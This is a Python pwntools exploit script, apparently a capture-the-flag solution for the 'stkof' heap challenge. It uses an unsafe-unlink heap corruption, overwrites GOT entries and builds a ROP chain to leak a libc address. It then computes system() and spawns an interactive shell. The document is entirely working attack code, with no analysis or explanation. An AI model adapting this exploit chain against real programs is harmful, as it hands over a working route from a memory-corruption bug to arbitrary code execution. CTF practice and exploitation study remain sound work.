from pwn import *
elf = ELF('./a679df07a8f3a8d590febad45336d031-stkof')

def Allocate(size):
    r.sendline('1')
    r.sendline(str(size))

def Fill(idx, data):
    r.sendline('2')
    r.sendline(str(idx))
    r.sendline(str(len(data)))
    r.send(data)

def Delete(idx):
    r.sendline('3')
    r.sendline(str(idx))

def Todo(data):
    r.sendline('4')
    r.send(data)

def exploit_unsafe_unlink():
    Allocate(0x80) #1 
    Allocate(0x80) #2 #smallbin size
    Allocate(0x80) #3
   
    PTR_SIZE = 0x8
    PUTS_GOT = 0x602020
    ATOL_GOT = 0x602080
    ATOI_GOT = 0x602088

    ptrAddr = 0x602140 + PTR_SIZE*2
    fakeChunkData = [
        0x00000000,			#prevSize
        0x00000000,			#size
        ptrAddr-PTR_SIZE*3,		#fd
        ptrAddr-PTR_SIZE*2,		#bk
        0,0,0,0,0,0,0,0,0,0,0,0,	#dummy
                                        #overflow
        0x80,				#next chunk's prevSize 
        0x90				#next chunk's chunk & ~1
    ]
    fakeChunk = ''.join([p64(_) for _ in fakeChunkData])

    # make fake chunk and manipulate the next chunk's header
    Fill(2,fakeChunk) 

    # It makes *ptrAddr = ptrAddr-3
    Delete(3)

    # https://github.com/acama/ctf/blob/master/hitcon2014/stkof/x.py#L90
    # ROP gadgets and stuff
    atoi_got = struct.pack("<Q", 0x602088)
    puts = struct.pack("<Q", 0x400C33)
    stdin_ptr = struct.pack("<Q", 0x6020D0)
    atol_got = struct.pack("<Q", 0x602080)
    pppret = struct.pack("<Q", 0x400dbe)
    rop_addr = struct.pack("<Q", 0x602150)
    prsppppret = struct.pack("<Q", 0x400dbd)
    fflush = struct.pack("<Q", 0x0000000000400810)
    puts = struct.pack("<Q", 0x400760)
    prdi = struct.pack("<Q", 0x400dc3)
    prbp = struct.pack("<Q", 0x4008e8)
    prsip15 = struct.pack("<Q", 0x400dc1)
    readin_func = struct.pack("<Q", 0x4009E8)
    do_read = struct.pack("<Q", 0x400B1E)
    read_loc = struct.pack("<Q", 0xC46A40 + 0x70-1)
    cmd_addr_adjust = struct.pack("<Q", 0xC46A40 + 0x70 + 0x20) 
    cmd_addr = struct.pack("<Q", 0xC46A40 + 0x20) 
    
    ropchain = prdi + atoi_got + prsip15 + struct.pack("<Q", 0x0) * 2 + puts
    ropchain += prdi + struct.pack("<Q", 0x0) + fflush 
    ropchain += prbp + read_loc
    ropchain += do_read
    ropchain += "X" * 16
    ropchain += prbp + cmd_addr_adjust
    ropchain += do_read
    ropchain += "X" * 16
    ropchain += prdi + cmd_addr
    ropchain += prsppppret + struct.pack("<Q", 0x000000000C46A40 - 0x18) 

    # puts s[1] = atoi's GOT Address
    Fill(2, p64(0)+p64(0)+p64(ATOL_GOT)+ropchain)

    # change ATOI's GOT Value
    Fill(1, p64(0x00400dbe))			# pop r13 ; pop r14 ; pop r15 ; ret

    # Trigger
    Todo(p64(0x00400dbd)+			# 0x0000000000400dbd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
         p64(ptrAddr-PTR_SIZE*3))		# rsp <- ptrAddr-3

    #pause()
    atoiAddr = u64(r.recv()[-7:-1]+'\x00\x00')
    systemAddr = atoiAddr + 0xe510		# libc2.23 offset
    log.info("atoiAddr : %x" % atoiAddr)
    log.info("systemAddr : %x" % systemAddr)

    r.send(p64(systemAddr)+"A"*6)
    r.send("sh ;")
    r.interactive()


if __name__ == "__main__":
    r = process(['./a679df07a8f3a8d590febad45336d031-stkof'])
    #pause()
    exploit_unsafe_unlink()




